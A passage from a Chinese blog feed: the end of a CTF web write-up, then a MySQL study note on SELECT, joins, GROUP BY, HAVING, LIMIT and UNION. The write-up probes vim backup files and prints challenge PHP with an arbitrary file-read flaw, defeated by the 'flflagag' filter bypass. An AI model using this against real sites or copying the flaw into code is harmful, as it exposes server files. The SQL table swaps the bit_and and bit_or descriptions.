<p>直接提交上去即可获得编码。<br>注意：以后一定要多检查元素，当时好像已经做出来了 ，可惜这个flag居然藏在控制台里面。<br>同理，还可以利用该函数的特性去实现写文件等等操作。</p>
<h2 id="0x2-代码混淆"><a href="#0x2-代码混淆" class="headerlink" title="0x2  代码混淆"></a>0x2  代码混淆</h2><p>有个小知识点，vim会自动产生备份文件，比如文件名为submit.php，则产生的文件可能为.submit.swp，submit.php~，submit.php.bak多试试。<br>然后就开始解混淆代码。</p>
<p>解混淆代码的时候，应该先把变量名提取出来，可以通过下面的代码dump变量出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"index.php"</span>;</span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>恢复出来的关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$IIIIIIIIIIll = @$_GET[<span class="string">'img_tet'</span>];</span><br><span class="line">$IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll);</span><br><span class="line">$IIIIIIIIIIll = str_replace(<span class="string">'flag'</span>,<span class="string">""</span>,$IIIIIIIIIIll);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($IIIIIIIIIIll!=<span class="string">""</span>)</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: imgage/jpeg'</span>);</span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment; filename='</span>.$IIIIIIIIIIll);</span><br><span class="line">    header(<span class="string">'Content-Lengh: '</span>.filesize($IIIIIIIIIIll));</span><br><span class="line">    $IIIIIIIIII11 = fopen($IIIIIIIIIIll,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">    $IIIIIIIIIlIl = fread($IIIIIIIIII11,filesize($IIIIIIIIIIll));</span><br><span class="line">    fclose($IIIIIIIIII11);</span><br><span class="line">    <span class="keyword">echo</span> $IIIIIIIIIlIl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目过滤flag，所以可以用flflagag绕过，即可得到flag，这个题其实也不难，只是毕竟是我第一次，需要纪念一下。</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL学习笔记(三)]]></title>
      <url>/2018/01/18/mysql3/</url>
      <content type="html"><![CDATA[<p>Mysql操作表,例如SELECT语句等。<br><a id="more"></a></p>
<h3 id="SELECT语句"><a href="#SELECT语句" class="headerlink" title="SELECT语句"></a>SELECT语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">	[all|<span class="keyword">distinct</span>|<span class="keyword">distinctrow</span>] # 指定是否重复行应被返回，如不指定默认值为all</span><br><span class="line">	[<span class="keyword">high_priority</span>] # 优先级设置</span><br><span class="line">	[<span class="keyword">straight_join</span>] # 促使mysql把表联合在一起,加快查询速度</span><br><span class="line">	[<span class="keyword">sql_small_result</span>] [<span class="keyword">sql_big_result</span>] [<span class="keyword">sql_buffer_result</span>] # 设置结果集的显示</span><br><span class="line">	[<span class="keyword">sql_cache</span>|sql_no_cache] [<span class="keyword">sql_calc_found_rows</span>] # <span class="keyword">cache</span>指定是否要把结果集存储在查询表缓存中，第三个选项指定结果集的行数，忽略<span class="keyword">limit</span></span><br><span class="line">	列名表达式 ...</span><br><span class="line">	[<span class="keyword">from</span> 表或视图 ... [...]]</span><br><span class="line">	[<span class="keyword">where</span> 条件]</span><br><span class="line">	[<span class="keyword">group</span> <span class="keyword">by</span> &#123;列名|表达式|<span class="keyword">position</span>&#125; [<span class="keyword">asc</span>|<span class="keyword">desc</span>],... [<span class="keyword">with</span> <span class="keyword">rollup</span>]]</span><br><span class="line">	[<span class="keyword">having</span> 条件]</span><br><span class="line">	[<span class="keyword">order</span> <span class="keyword">by</span> &#123;列名|表达式|<span class="keyword">position</span>&#125; [<span class="keyword">asc</span>|<span class="keyword">desc</span>],...]</span><br><span class="line">	[<span class="keyword">limit</span> &#123;[<span class="keyword">offset</span>,] <span class="keyword">row_count</span>|<span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">	[<span class="keyword">procedure</span> 存储过程名(参数...)]</span><br><span class="line">	[<span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'文件名'</span> [<span class="built_in">character</span> <span class="keyword">set</span> 字符集]  # 将表中的行导出到文件中</span><br><span class="line">	export_options|<span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'文件名'</span>|info 变量名 ...]</span><br><span class="line">	[<span class="keyword">for</span> <span class="keyword">update</span>|<span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span>]] # 对结果集加锁，<span class="keyword">for</span> <span class="keyword">update</span>更推荐</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="选择列"><a href="#选择列" class="headerlink" title="选择列"></a>选择列</h3><p><strong>as 指定列别名</strong></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 学号 <span class="keyword">as</span> <span class="keyword">number</span> <span class="keyword">from</span> stu;   # 指定结果集别名</span><br></pre></td></tr></table></figure>
<p>替换查询结果中的数据<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span></span><br><span class="line">	<span class="keyword">when</span> 条件<span class="number">1</span> <span class="keyword">then</span> 表达式<span class="number">1</span></span><br><span class="line">	<span class="keyword">when</span> 条件<span class="number">2</span> <span class="keyword">then</span> 表达式<span class="number">2</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">else</span> 表达式n</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">EXP:</span><br><span class="line">	<span class="keyword">select</span> 编号,姓名</span><br><span class="line">	<span class="keyword">case</span></span><br><span class="line">	 <span class="keyword">when</span> 编号 <span class="keyword">is</span> null <span class="keyword">then</span> <span class="comment">'ff'</span></span><br><span class="line">	 <span class="keyword">else</span> <span class="comment">'ok'</span></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">from</span> stuinfo;</span><br></pre></td></tr></table></figure></p>
<p><strong>计算列值</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 表达式 ...  # 可以进行加减乘除取余%等运算</span><br><span class="line"><span class="keyword">exp</span>：</span><br><span class="line"><span class="keyword">select</span> 学号,成绩*<span class="number">1.2</span> <span class="keyword">from</span> xs <span class="keyword">where</span> <span class="keyword">ID</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<h4 id="聚合函数-aggregation-function"><a href="#聚合函数-aggregation-function" class="headerlink" title="聚合函数(aggregation function)"></a>聚合函数(aggregation function)</h4><p><strong>聚合函数常用于对一组值进行计算，返回单个值，通常与group by子句一起使用,作用于列</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">函数名</th>
<th>说明</th>
<th>语法</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">count</td>
<td>求组中系数，返回int类型数据</td>
<td>count({[all&#124;distinct] 表达式}&#124;*)</td>
<td>&#42;将返回检索行总数目，包括其值包含null</td>
</tr>
<tr>
<td style="text-align:center">max</td>
<td>求最大值</td>
<td>max([all&#124;distinct] 表达式)</td>
<td>数据类型可以是数字、字符和时间日期类型</td>
</tr>
<tr>
<td style="text-align:center">min</td>
<td>求最小值</td>
<td>略</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">sum</td>
<td>返回表中所有值的和</td>
<td>sum/avg([all&#124;distinct] 表达式)</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">avg</td>
<td>组中平均值</td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">std/stddev</td>
<td>返回标准差</td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">variance</td>
<td>方差</td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">group_concat</td>
<td>返回由属于一组的列值连接组合而成的结果</td>
<td>用法略</td>
<td>该函数返回指定列的所有非NULL值，中间用逗号隔开，长度最大限制1024</td>
</tr>
<tr>
<td style="text-align:center">bit_and</td>
<td>逻辑或</td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">bit_or</td>
<td>逻辑与</td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">bit_xor</td>
<td>逻辑异或</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h3 id="FROM子句"><a href="#FROM子句" class="headerlink" title="FROM子句"></a>FROM子句</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from table_reference ...</span><br><span class="line">	table_reference:</span><br><span class="line">表名 [[as] 表名别名] [&#123;use|ignore|force&#125; index (key_list)]  <span class="comment">/*查询表，use指使用索引，ignore指忽略索引*/</span></span><br><span class="line">|join_table                                                <span class="comment">/*连接表*/</span></span><br></pre></td></tr></table></figure>
<p><strong>多表连接</strong><br>1)全连接，实质是表的等值连接<br>这种连接会产生所有可能的组合，也就是每个表的行数之积<br>“select 编号,ID from stuinfo,student;”这样会返回两个表行数之积,通常需要用where语句限制结果行数<br>2)JOIN连接<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">join_table:</span><br><span class="line">	table_reference [inner|<span class="type">cross</span>] join table_factor [join_condition]</span><br><span class="line">	|<span class="type">table_reference</span> straight_join table_factor</span><br><span class="line">	|<span class="type">table_reference</span> straight_join table_factor on conditional_expr</span><br><span class="line">	|<span class="type">table_reference</span> &#123;LEFT|<span class="type">RIGHT</span>&#125; [outer] join table_reference join_condition</span><br><span class="line">	|<span class="type">table_reference</span> natural [&#123;LEFT|<span class="type">RIGHT</span>&#125; [outer]] join_table_factor</span><br></pre></td></tr></table></figure></p>
<p>table_reference指定要连接的表名<br>join_condition：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">on</span> 条件</span><br><span class="line">|<span class="keyword">using</span> (列...)</span><br></pre></td></tr></table></figure></p>
<p>on条件主要用于连接表，其他不属于连接表的条件可以使用where子句来指定，inner指内连接，是系统默认的方式。<br>exp:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 编号,<span class="keyword">ID</span> <span class="keyword">from</span> stuinfo <span class="keyword">join</span> student;</span><br></pre></td></tr></table></figure></p>
<p>join还可以将自身进行连接，称为自连接，但是要指定不同的别名</p>
<h3 id="WHERE子句"><a href="#WHERE子句" class="headerlink" title="WHERE子句"></a>WHERE子句</h3><p>where子句必须紧跟在from子句之后，用于确定选取行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">where</span> 条件</span><br></pre></td></tr></table></figure>
<p>其中条件为查询语句<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">条件=<span class="symbol">:</span></span><br><span class="line">	&lt;precdicate&gt;                             </span><br><span class="line">	<span class="params">|&lt;precdicate&gt;&#123;<span class="keyword">and</span>|</span><span class="keyword">or</span>&#125;&lt;precdicate&gt;</span><br><span class="line">	<span class="params">|(条件)</span></span><br><span class="line"><span class="params">	|</span><span class="keyword">not</span> 条件</span><br></pre></td></tr></table></figure></p>
<p>precidicate为判定运算，结果又TRUE，FALSE或UNKNOWN<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">&lt;precdicate&gt;</span>:</span><br><span class="line">	表达式 &#123;=|<span class="string">&lt;</span>|<span class="string">&lt;=</span>|<span class="string">&gt;=</span>|<span class="string">&lt;=&gt;</span>|<span class="string">&lt;&gt;</span>|<span class="string">!=&#125; 表达式                    # "&lt;=&gt;"相等或都等于空返回true，否则返回false，绝不会返回unknown  </span></span><br><span class="line"><span class="string">	</span>|<span class="string">表达式 [not] like 表达式 [escape 'escape_character']</span></span><br><span class="line"><span class="string">	</span>|<span class="string">表达式 [not] [regexp</span>|<span class="string">rlike] 表达式</span></span><br><span class="line"><span class="string">	</span>|<span class="string">表达式 [not] between 表达式 and 表达式</span></span><br><span class="line"><span class="string">	</span>|<span class="string">表达式 is [not] null</span></span><br><span class="line"><span class="string">	</span>|<span class="string">表达式[not] in (subquery </span>|<span class="string">表达式[,...n])</span></span><br><span class="line"><span class="string">	</span>|<span class="string">表达式 =</span>|<span class="string">&lt;</span>|<span class="string">&lt;=</span>|<span class="string">&gt;=</span>|<span class="string">&lt;=&gt;</span>|<span class="string">&lt;&gt;</span>|<span class="string">!=&#125; &#123;all</span>|<span class="string">some</span>|<span class="string">any&#125; (subquery)</span></span><br><span class="line"><span class="string">	</span>|<span class="string">exist (子查询)</span></span><br></pre></td></tr></table></figure></p>
<p><strong>模式匹配</strong></p>
<h4 id="1-like运算符"><a href="#1-like运算符" class="headerlink" title="1)like运算符"></a>1)like运算符</h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表达式 [not] like 表达式 [escape <span class="string">'escape_character'</span>]</span><br></pre></td></tr></table></figure>
<p>模式匹配时，可用%和_进行模糊查询，%代表0个或多个字符,符号_代表单个字符<br>escape 转义字符，例如当要匹配的字符串中有_或%时，此时应通过该字符前的转义字符指明其为模式串中的字符，使用escape可以指定转义字符</p>
<h4 id="2-regexp-正则表达式-，是mysql的一个功能。"><a href="#2-regexp-正则表达式-，是mysql的一个功能。" class="headerlink" title="2)regexp(正则表达式)，是mysql的一个功能。　"></a>2)regexp(正则表达式)，是mysql的一个功能。　</h4><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">match_exp <span class="string">[not]</span><span class="string">[regexp|rlike]</span> match_exp</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">特殊字符</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">^</td>
<td style="text-align:center">匹配字符串的开始部分</td>
</tr>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">匹配字符串结束部分</td>
</tr>
<tr>
<td style="text-align:center">.</td>
<td style="text-align:center">匹配任何一个字符</td>
</tr>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:center">匹配*之前的0个或多个字符的任何序列</td>
</tr>
<tr>
<td style="text-align:center">+</td>
<td style="text-align:center">匹配+之前的1个或多个字符的任何序列</td>
</tr>
<tr>
<td style="text-align:center">?</td>
<td style="text-align:center">匹配？之前的0个或多个字符</td>
</tr>
<tr>
<td style="text-align:center">{n}</td>
<td style="text-align:center">匹配括号前的内容出现n次的序列</td>
</tr>
<tr>
<td style="text-align:center">()</td>
<td style="text-align:center">匹配括号里的内容</td>
</tr>
<tr>
<td style="text-align:center">[abc]</td>
<td style="text-align:center">略</td>
</tr>
<tr>
<td style="text-align:center">[a-z]</td>
<td style="text-align:center">略</td>
</tr>
<tr>
<td style="text-align:center"><sup><a href="#fn_a-z" id="reffn_a-z">a-z</a></sup></td>
<td style="text-align:center">略</td>
</tr>
<tr>
<td style="text-align:center">&#124;</td>
<td style="text-align:center">匹配符号左边或右边出现的字符串</td>
</tr>
<tr>
<td style="text-align:center">[[..]]</td>
<td style="text-align:center">匹配方括号里出现的符号</td>
</tr>
<tr>
<td style="text-align:center">[[:&lt;:]和[[:&gt;:]]</td>
<td style="text-align:center">匹配一个单词的开始和结束</td>
</tr>
<tr>
<td style="text-align:center">[[:]</td>
<td style="text-align:center">匹配方括号里出现的字符串中的任意一个字符</td>
</tr>
</tbody>
</table>
</div>
<p><strong>范围比较(between或者in)</strong><br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span> [<span class="keyword">not</span>] between <span class="built_in">exp1</span> <span class="keyword">and</span> <span class="built_in">exp2</span>   <span class="comment"># exp1必须小于exp2，表达式也可是字符串</span></span><br><span class="line"><span class="built_in">exp</span> <span class="keyword">in</span> (exps [,...n])             <span class="comment"># 该关键字主要用于表达子查询</span></span><br></pre></td></tr></table></figure></p>
<p><strong>空值比较</strong><br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span> <span class="keyword">is</span> [<span class="keyword">not</span>] <span class="literal">null</span></span><br></pre></td></tr></table></figure></p>
<p><strong>子查询</strong><br>    指使用另一个查询的结果作为条件的一部分，即查询的嵌套</p>
<h4 id="1-in子查询"><a href="#1-in子查询" class="headerlink" title="1)in子查询"></a>1)in子查询</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span> [<span class="literal">not</span>] <span class="keyword">in</span> (subquery)</span><br></pre></td></tr></table></figure>
<p>in子查询只能返回一列数据，对于较复杂的查询可使用嵌套的子查询</p>
<h4 id="2-比较子查询（使表达式的值与子查询的结果进行比较运算）"><a href="#2-比较子查询（使表达式的值与子查询的结果进行比较运算）" class="headerlink" title="2)比较子查询（使表达式的值与子查询的结果进行比较运算）"></a>2)比较子查询（使表达式的值与子查询的结果进行比较运算）</h4><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表达式 &#123;<span class="variable">&lt;|&lt;=|=|&gt;</span>|<span class="string">&gt;=</span>|<span class="string">!=</span>|<span class="string">&lt;&gt;&#125; &#123;all</span>|<span class="string">some</span>|<span class="string">any&#125; (subquery)</span></span><br></pre></td></tr></table></figure>
<p>all指定表达式要与结果集的每个值都进行比较，全部满足时才返回true，否则返回false。<br>some与any同义，找到满足的值就会返回true，否则返回false。</p>
<h4 id="3-exists子查询"><a href="#3-exists子查询" class="headerlink" title="3)exists子查询"></a>3)exists子查询</h4><p>判断查询结果集是否为空表</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="keyword">not</span>] <span class="built_in">exists</span> (subquery)</span><br></pre></td></tr></table></figure>
<p>以上各种子查询还可用在select的其他子句中，例如from语句，但是必须为子查询产生的一个中表定义一个别名</p>
<h3 id="GROUP-BY子句"><a href="#GROUP-BY子句" class="headerlink" title="GROUP BY子句"></a>GROUP BY子句</h3><p>根据字段进行分组，所要查找的内容不得多于分组数<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="comment">&#123;列名|表达式|position&#125;</span> [<span class="keyword">asc</span>|<span class="keyword">desc</span>],... [<span class="keyword">with</span> rollup]</span><br></pre></td></tr></table></figure></p>
<p>rollup用于对group by子句指定的各列产生汇总行。</p>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>,username <span class="keyword">from</span> student <span class="keyword">where</span> job=<span class="string">'信息安全'</span> <span class="keyword">group</span> <span class="keyword">by</span> username;</span><br></pre></td></tr></table></figure>
<p>上述语句执行时会报错，原因在于</p>
<blockquote>
<p><em>group by</em> 语句的执行过程为先执行group by子句，然后对gruop by 语句的汇总行再进行操作，本例中group by子句执行后只产生了一列(列名为username)，所以执行到查询name字段时会无法查询从而报错。<br>但是这个时候可以使用聚合函数来查询其他字段的信息，因为聚合函数可以作用于所有列，当然也可以增加group by 子句的字段</p>
</blockquote>
<p><strong>用例解析</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 专业,性别,count(编号) <span class="keyword">from</span> stuinfo<span class="built_in"> group </span>by 专业,性别 with rollup;</span><br></pre></td></tr></table></figure>
<p><strong>返回结果</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">专业</th>
<th style="text-align:center">性别</th>
<th style="text-align:center">count(编号)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">信息安全</td>
<td style="text-align:center">女</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">信息安全</td>
<td style="text-align:center">男</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">信息安全</td>
<td style="text-align:center">NULL</td>
<td style="text-align:center">5</td>
</tr>
<tr>
<td style="text-align:center">土木工程</td>
<td style="text-align:center">男</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">土木工程</td>
<td style="text-align:center">NULL</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">计算机</td>
<td style="text-align:center">女</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">计算机</td>
<td style="text-align:center">男</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">计算机</td>
<td style="text-align:center">NULL</td>
<td style="text-align:center">9</td>
</tr>
<tr>
<td style="text-align:center">NULL</td>
<td style="text-align:center">NULL</td>
<td style="text-align:center">20</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 专业,性别,count(编号) <span class="keyword">from</span> stuinfo<span class="built_in"> group </span>by 性别,专业 with rollup;</span><br></pre></td></tr></table></figure>
<p><strong>返回结果</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">专业</th>
<th style="text-align:center">性别</th>
<th style="text-align:center">count(编号)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">信息安全</td>
<td style="text-align:center">女</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">计算机</td>
<td style="text-align:center">女</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">NULL</td>
<td style="text-align:center">女</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">信息安全</td>
<td style="text-align:center">男</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">土木工程</td>
<td style="text-align:center">男</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">计算机</td>
<td style="text-align:center">男</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">NULL</td>
<td style="text-align:center">男</td>
<td style="text-align:center">16</td>
</tr>
<tr>
<td style="text-align:center">NULL</td>
<td style="text-align:center">NULL</td>
<td style="text-align:center">20</td>
</tr>
</tbody>
</table>
</div>
<p>以上两个查询语句只是group by语句后面的顺序不同，该语句的组织方式是按列的排序的逆序进行汇总，例如第一例先对性别字段产生了汇总（针对专业相同的行），然后对专业名和性别名均不同的行产生了汇总行，如果列数是多列的话，也依然会这样依次汇总。</p>
<h3 id="HAVING子句"><a href="#HAVING子句" class="headerlink" title="HAVING子句"></a>HAVING子句</h3><p>HAVING子句用于在group by子句后选择行，和WHERE子句类似，where子句用于在<em>from</em>  子句后选择行，区别是<font face="楷体"> having子句可以作用于聚合函数，而where子句不可以</font>。<br><strong>语法格式</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">having 条件</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 专业,<span class="keyword">avg</span>(年龄) <span class="keyword">from</span> stuinfo <span class="keyword">where</span> 年龄 &lt; <span class="number">96</span> <span class="keyword">group</span> <span class="keyword">by</span> 专业 <span class="keyword">having</span> <span class="keyword">avg</span>(年龄);</span><br></pre></td></tr></table></figure>
<h3 id="ORDER-BY子句"><a href="#ORDER-BY子句" class="headerlink" title="ORDER BY子句"></a>ORDER BY子句</h3><p>如果不适用order by子句的话，结果集中的行的顺序将是不可预料的，使用该语句行可以对行的排序顺序方式进行指定，如果order by子句后面指定了多个条件，则会按照逆序方向依次排序。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by &#123;列名|表达式|position&#125; [asc|desc], ...</span><br></pre></td></tr></table></figure></p>
<p><font face="fantasy">position</font> 表示结果集中该位置的列排序，是一个正整数。</p>
<p><strong>举例</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from stuinfo order by 年龄;  # 根据年龄来排序</span><br></pre></td></tr></table></figure>
<h3 id="LIMIT子句"><a href="#LIMIT子句" class="headerlink" title="LIMIT子句"></a>LIMIT子句</h3><p>LIMIT子句用来限制 <em>select</em>  语句返回的行数。</p>
<p><strong>语法格式</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<blockquote>
<p><em>offset</em> 为对于结果集首行的偏移量（首行偏移量为0），如offset=3，则会从第四行开始返回数据。</p>
</blockquote>
<p><strong>举例</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> stuinfo <span class="keyword">where</span> 专业=<span class="string">'信息安全'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line">select * from stuinfo where 专业='信息安全' limit 2 offset 1; # 这两个语句是等价的</span><br></pre></td></tr></table></figure>
<h3 id="UNION语句"><a href="#UNION语句" class="headerlink" title="UNION语句"></a>UNION语句</h3><p><code>UNION</code> 语句用来把多个 <em>select</em> 语句返回的结果组合到一个结果集中。</p>
<p><strong>语法格式</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ...</span><br><span class="line"><span class="keyword">union</span> [ALL | <span class="keyword">DISTINCT</span>] <span class="keyword">select</span> ...</span><br><span class="line">[ <span class="keyword">union</span> [ALL | <span class="keyword">DISTINCT</span>] <span class="keyword">select</span> ... ]</span><br></pre></td></tr></table></figure>
<p><strong>说明</strong></p>
<p>select语句为常规的select语句，但是必须遵守以下规则</p>
<blockquote>
<p>1、各个select语句对应位置的列应该具有相同的列名、类型和数目，<br>2、只有最后一个select语句可以使用 <code>into outfile</code><br>3、<code>order by</code> 和 <code>limit</code> 只能在整个语句最后指定，并对整个最终结果起作用。<br>4、使用union语句的时候，MySQL会自动剔除重复数据，所以<code>distinct</code>可以省去。</p>
</blockquote>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> stuinfo <span class="keyword">where</span> 专业=<span class="string">'信息安全'</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> stuinfo <span class="keyword">where</span> 专业=<span class="string">'土木工程'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span> <span class="keyword">limit</span> <span class="number">6</span>;</span><br></pre></td></tr></table></figure>
